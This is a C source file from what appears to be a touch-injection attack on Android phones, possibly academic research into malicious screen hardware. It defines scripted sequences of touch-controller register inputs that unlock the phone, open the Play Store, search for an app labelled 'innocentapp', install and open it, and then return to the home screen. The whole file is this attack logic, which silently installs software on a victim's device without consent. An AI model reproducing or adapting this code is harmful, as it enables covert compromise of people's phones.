#include "touch_injection_APP.h"

/*
 * scripts_0xc_APP & scripts_0x8_APP:
 * 	The whole touches.
 */
static const uint8_t* const scripts_0xc_APP[] = {
  reg_0xc, reg_0xc, reg_0xc, reg_0xc, reg_0xc, reg_0xc, reg_0xc_finish, // Swipe
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, // Home X3
  reg_0xc, reg_0xc_finish, // Menu
  reg_0xc, reg_0xc_finish, // Search
  reg_0xc_tentouches, reg_0xc_finish,
  //reg_0xc, reg_0xc_finish_gui_delayed, // Enter <- AMIR : we dont need to press enter here.
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, // MenuFirstOption
  reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish, // PlayStoreSearch
  reg_0xc_tentouches, reg_0xc_finish, reg_0xc_sixtouches, reg_0xc_finish, // innocentapp omer
  reg_0xc, reg_0xc_finish, // Enter
  reg_0xc, reg_0xc_finish, // PlayStoreFirstOption
  reg_0xc, reg_0xc_finish, // Install
  reg_0xc, reg_0xc_finish, // Accept install
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish,reg_0xc, reg_0xc_finish, //DELAY - touches
  reg_0xc, reg_0xc_finish,  // Open installed
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, // Home X3
  stop_signal,
 };

static const uint8_t* const scripts_0x8_APP[] = {
  SwipeUp_0, SwipeUp_1, SwipeUp_2, SwipeUp_3, SwipeUp_4, SwipeUp_5, TouchEND_SWIPE,
  PressHome, TouchEND, PressHome, TouchEND, PressHome, TouchEND,
  PressMenu, TouchEND_GUI,
  PressSearch, TouchEND_GUI,
  PressPLAYsSTORE, TouchEND_ten,
  //PressEnter, TouchEND,  <- AMIR : we dont need to press enter here.
  PressMenuFirstOption, TouchEND_INTERNET, Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,
  Delay_Touch,TouchEND_DOWNLOAD,PressPlayStoreSearch, TouchEND_GUI,
  PressINNOCENTAP,TouchEND_ten , Press_p_SPACE_omer, TouchEND_six,
  PressEnter, TouchEND_GUI,
  PressPlayStoreFirstOption, TouchEND_GUI,
  PressInstall, TouchEND_GUI,
  PressAcceptInstall, TouchEND_DOWNLOAD,
  Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,
  PressOpenInsalled, TouchEND ,
  PressHome, TouchEND, PressHome, TouchEND, PressHome, TouchEND,
  stop_signal,
 };

/*
 * Initializing start point for the script.
 */
static const uint8_t** iter0xc_APP = ( const uint8_t**) scripts_0xc_APP;
static const uint8_t** iter0x8_APP = ( const uint8_t**) scripts_0x8_APP;

const uint8_t* get_injection_APP(uint8_t reg)
{
  if (reg == 0x6)
  {
    return reg_0x6;
  }
  else if (reg == 0xc)
  {
    iter0xc_APP++;
    return *(iter0xc_APP - 1);
  }
  else if (reg == 0x8)
  {
    iter0x8_APP++;
    return *(iter0x8_APP - 1);
  }
  else return 0;
}


void destroy_injection_APP()
{
  iter0xc_APP = ( const uint8_t**) scripts_0xc_APP;
  iter0x8_APP = ( const uint8_t**) scripts_0x8_APP;
}
